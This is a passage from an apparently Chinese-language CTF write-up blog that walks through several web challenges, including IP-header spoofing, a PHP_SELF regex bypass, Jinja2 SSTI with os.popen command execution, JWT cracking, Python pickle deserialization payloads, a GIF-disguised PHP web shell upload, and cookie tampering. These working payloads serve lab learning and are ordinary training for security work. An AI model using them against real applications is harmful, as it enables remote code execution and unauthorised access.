<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>    <span class="hljs-keyword">die</span>(); <br>&#125; <br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123; <br>    <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>); <br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; <br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;<br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure>
<p>出现了新的源码<br>第一步是伪造ip<br>有如下几种方式</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">Client</span>-ip:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Client-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Remote-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Rriginating-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Remote-addr:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">HTTP_CLIENT_IP</span>:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Real-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Originating-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">via</span>:<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure>
<p>测试仅client-ip可以使用<br>header中添加client-ip<br>file_get_contents用php伪协议绕过</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">?<span class="hljs-number">2333</span>=php://<span class="hljs-built_in">input</span><br>pos<span class="hljs-variable">t:todat</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">a</span> happy day<br></code></pre></td></tr></table></figure>
<p>这步开始用burp操作，hackbar有点问题</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl">function change($v)&#123; <br>    $v = base64_decode($v); <br>    $re = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($v);$i++)&#123; <br>        $re .= <span class="hljs-keyword">chr</span> ( <span class="hljs-keyword">ord</span> ($v[$i]) + $i*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> $re; <br>&#125;<br></code></pre></td></tr></table></figure>
<p>这块反向编译下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123;<br><br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) - <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> );<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/KZK2SNH27KTYEM6Y.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>点击source查看源码</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br>include <span class="hljs-string">&#x27;config.php&#x27;</span>; <span class="hljs-regexp">//</span> FLAG is defined <span class="hljs-keyword">in</span> config.php<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  highlight_file(basename(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$secret</span> = bin2hex(random_bytes(<span class="hljs-number">64</span>));<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$guess</span> = (string) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>  <span class="hljs-keyword">if</span> (hash_equals(<span class="hljs-variable">$secret</span>, <span class="hljs-variable">$guess</span>)) &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>  &#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
<p>代码告诉了我们flag在config.php里<br>但是下面又过滤了config.php&#x2F;<br>$_SERVER[‘PHP_SELF’]返回的是路径+脚本名<br>下面有一行代码表示可以直接获得flag，但要能够破解随机数就能得到flag，这个难度太大了。。</p>
<p>这里是有突破点的</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>注意这里&#x2F;config.php/*$是匹配了尾部的，我们可以通过尾部添加不可显字符来绕过正则，比如%ff</p>
<p>basename()<br>会返回路径重的文件名部分。比如&#x2F;index.php&#x2F;config.php使用basename()之后返回config.php。<br>basename()会去掉文件名开头的非ASCII值。</p>
<p>这里写一段php语句来搞清楚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-string">&#x27;index.php/config.php%ff?source&#x27;</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]);<br><br></code></pre></td></tr></table></figure>

<p><img src="/images/YVE0N5JFKM9LXPB.png" srcset="/img/loading.gif" lazyload><br>因为$_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用&#x2F;index.php&#x2F;config.php&#x2F;%ff?source来读取flag。<br><img src="/images/RZX7CIEXRHL29BSAOH.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>题目说了是关于flask的<br>源代码有提示参数为search<br>所以直接ssti注入</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">2</span>*<span class="hljs-number">4</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/DHRQ62NL9WHJ3KCS.png" srcset="/img/loading.gif" lazyload><br>因为是用flask搭建的网站，所以这里的判断很自然就是jinja2的模板注入。</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0]&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p>用bases或mro都行，只要打印返回(&lt;class ‘object’&gt;,)，找到了他的基类object即可<br><img src="/images/F34OP5L5YL70ND5.png" srcset="/img/loading.gif" lazyload><br>接下来我们使用subclasses() 这个方法，这个方法返回的是这个类的子类的集合，也就是object类的子类的集合。</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/XB3KH95A5B5FCPYQ.png" srcset="/img/loading.gif" lazyload><br>在基本类的子类中找到重载过的__init__类(貌似是个类就行)<br>那么我们直接找第一个显示的类</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58]&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/JOCO5EUQUU6V8XXB.png" srcset="/img/loading.gif" lazyload></p>
<p>测试发现globals被过滤了，使用拼凑法绕过</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;]&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p>接下来利用eval进行命令执行</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/S9WS6UXXSXDW65FE.png" srcset="/img/loading.gif" lazyload><br>flag在flasklight中</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;cat flasklight/coomme_geeeett_youur_flek&quot;).read()&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2124510">关于flask的SSTI注入[通俗易懂]</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679?time__1311=n4+xnD0DBDgDc7D9DUO4BqOoTnl7WSWDIxrD#toc-8">flask之ssti模版注入从零到入门</a></p>
<h2 id="ciscn2019-华北赛区-day1-web2-ikun"><a href="#ciscn2019-华北赛区-day1-web2-ikun" class="headerlink" title="ciscn2019-华北赛区-day1-web2-ikun"></a>ciscn2019-华北赛区-day1-web2-ikun</h2><p>根据页面的提示，需要找到lv6<br>但是翻了很多页也没有找到lv6<br>写一个python脚本</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs maxima">import requests<br><br>url = &#x27;http://eca3df9d-<span class="hljs-number">0ecd</span>-<span class="hljs-number">46b6</span>-b0ab-7166f51fb956.node5.buuoj.cn:<span class="hljs-number">81</span>/shop?page=&#x27;<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2000</span>):<br>    a = requests.<span class="hljs-built_in">get</span>(url + str(i))<br>    <span class="hljs-keyword">if</span> &#x27;lv6.png&#x27; <span class="hljs-keyword">in</span> a.text:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-built_in">break</span><br><br></code></pre></td></tr></table></figure>
<p>在181页发现lv6<br>发现价格有点高，看能不能抓包改下价格<br>只能改折扣<br><img src="/images/JBFBSKZY4FWH5KWZ7KC.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/V7NOFLUCZI1RNT.png" srcset="/img/loading.gif" lazyload><br>这里涉及到JWT伪造漏洞<br>攻击工具<a href="https://link.csdn.net/?target=https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>获得密匙<br>我使用的是kali系统<br><img src="/images/ECFP2LKJ1JB7QPI9LO8.png" srcset="/img/loading.gif" lazyload><br>破解获得密匙1Kun<br>然后访问<a target="_blank" rel="noopener" href="https://jwt.io/">JWT攻击网站</a>,将JWT复制上去即可<br><img src="/images/JNBAT35QJHZPXF.png" srcset="/img/loading.gif" lazyload><br>将username改为admin，还有将刚才的密匙填入<br>将cookies的JWT替换，得到<br><img src="/images/YLWH6TZTRJ3H32BKER9.png" srcset="/img/loading.gif" lazyload><br>源码中发现<br><img src="/images/R8M363537PNFDRFIUH.png" srcset="/img/loading.gif" lazyload></p>
<p>找到admin.py<br><img src="/images/CHUL1P513UOV9ZY610EI.png" srcset="/img/loading.gif" lazyload><br>这里可以理解为与php一样的反序列化</p>
<p>self.render(‘form.html’, res&#x3D;p, member&#x3D;1)<br>这段代码的意思就是找到模板文件，进行渲染，从而显示页面<br>来观察一下form.html页面<br><img src="/images/P0U5OSG2IY3UT03FE6C.png" srcset="/img/loading.gif" lazyload><br>说明传入的是可以直接进行回显的，而且可以将自定义的类进行序列化和反序列化，因此存在Pickle反序列化漏洞，那我们就可以构造一个通过pickle.dumps序列化的payload，从而被解析读取flag或其他信息。<br>我们构建一个类，类里面的__reduce__python魔术方法会在该类被反序列化的时候会被调用<br>构造payload可以使用方法__reduce__(self)，先要获取的flag文件的位置，然后进行读取</p>
<p>点击一键成为大会员后，替换become<br>os.system和os.popen<br>os.system 调用系统命令，完成后退出，返回结果是命令执行状态，一般是0<br>os.popen() 无法读取程序执行的返回值<br>这两个函数只有以print输出时才会回显，如果是以return返回的就不会显示结果。<br>可以使用commands.getoutput()这个函数来进行代替，构造payload</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> payload(<span class="hljs-title">object</span>):</span><br><span class="hljs-class">    def __reduce__(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">       return (<span class="hljs-title">commands</span>.<span class="hljs-title">getoutput</span>,(&#x27;<span class="hljs-title">ls</span> /&#x27;,))</span><br><span class="hljs-class"></span><br><span class="hljs-class">a = pickle.dumps(<span class="hljs-title">payload</span>())</span><br><span class="hljs-class">a = urllib.quote(<span class="hljs-title">a</span>)</span><br><span class="hljs-class">print a</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure>
<p><img src="/images/VCLCNT98$GCXFF8.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/JN7XR4QJ48H7LL1I58.png" srcset="/img/loading.gif" lazyload></p>
<p>找到flag.txt文件，并读取</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> payload(<span class="hljs-title">object</span>):</span><br><span class="hljs-class">    def __reduce__(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">       return (<span class="hljs-title">commands</span>.<span class="hljs-title">getoutput</span>,(&#x27;<span class="hljs-title">cat</span> /<span class="hljs-title">flag</span>.<span class="hljs-title">txt&#x27;</span>,))</span><br><span class="hljs-class"></span><br><span class="hljs-class">a = pickle.dumps(<span class="hljs-title">payload</span>())</span><br><span class="hljs-class">a = urllib.quote(<span class="hljs-title">a</span>)</span><br><span class="hljs-class">print a</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>       <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))<br><br>a = pickle.dumps(payload())<br>a = urllib.quote(a)<br><span class="hljs-built_in">print</span> a<br><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252189.html">Python Pickle反序列化漏洞</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cjsblog/p/9277677.html">认识JWT</a></p>
<h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>很简单的题目<br>除了login和register没有其它的入口<br>那么我们先注册登录<br>登录成功后跳另外一个页面<br>弹出Please Login First!<br>查看源代码发现这是页面自带的</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Please Login First!&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>不用管他</p>
<p>这里有个图片上传按钮<br>先上传<br>3.png<br>内容为一句话木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>exif_imagetype not image!<br>欺骗一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89A<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>成功欺骗<br>页面没有回显上传链接<br>源代码看一下<br><img src="/images/0WZD35M4RBCRVD79DG9E.png" srcset="/img/loading.gif" lazyload><br>找到<br>但进入这个链接我们是没办法执行命令的<br>盲猜一手<br>我们将上传的文件后缀改为3.png.php<br><img src="/images/TES6BFIKBE2QOECD1O.png" srcset="/img/loading.gif" lazyload><br>后缀为php<br>进入链接<br>payload</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>phpinfo()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/Y0RSJYKMIZ5HY04SB.png" srcset="/img/loading.gif" lazyload><br>看看没有过滤什么函数<br>直接</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs maxima">a=<span class="hljs-built_in">system</span>(&#x27;ls&#x27;);<br>//GIF89A d41d8cd98f00b204e9800998ecf8427e.php<br><br>a=<span class="hljs-built_in">system</span>(&#x27;ls /&#x27;);<br>//GIF89A Flag_aqi2282u922oiji bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr <span class="hljs-built_in">var</span><br><br>a=<span class="hljs-built_in">system</span>(&#x27;cat /Flag_aqi2282u922oiji&#x27;);<br>//GIF89A flag&#123;4e0eee16-<span class="hljs-number">52b1</span>-<span class="hljs-number">4248</span>-<span class="hljs-number">8565</span>-2da97f5cdb35&#125;<br></code></pre></td></tr></table></figure>

<h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>页面有三种饼干，其中最贵的饼干为flag饼干，推测购买这款饼干就能获得flag<br>但我们的初始资金为50刀，买不起flag饼干，源码看下啥也没有<br>先购买1刀的饼干<br>抓包看看有什么数据<br><img src="/images/DF7AUEXKU5PTRO3T.png" srcset="/img/loading.gif" lazyload><br>神似base64加密，解密一下<br><img src="/images/AY0ZIKGBRGIA0.png" srcset="/img/loading.gif" lazyload><br>不知道history里的数据是什么样的<br><img src="/images/B6JIXDQNYCIHZP5.png" srcset="/img/loading.gif" lazyload><br>后面又抓住了一个，找到数据<br>试着改一下json包的数据<br>这回我们买10刀的<br><img src="/images/VCH20KR4EMS37AMS.png" srcset="/img/loading.gif" lazyload><br>修改money<br>回到页面发现钱变为我们想要的，这时我们直接购买flag饼干即可</p>
